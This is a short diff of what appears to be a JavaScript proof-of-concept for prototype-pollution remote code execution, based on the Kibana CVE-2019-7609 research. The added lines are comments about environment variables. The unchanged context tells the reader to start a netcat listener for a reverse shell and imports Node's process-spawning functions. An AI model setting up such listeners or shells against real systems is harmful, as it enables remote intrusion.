@@ -1,4 +1,7 @@
-﻿// based on https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/
+﻿// FIXED !!!
+// we can only add a new env var but not rewrite them
+
+// based on https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/
 // run `nc -lnvp 4242`
 const { spawn, spawnSync, exec, execSync } = require('child_process');
 
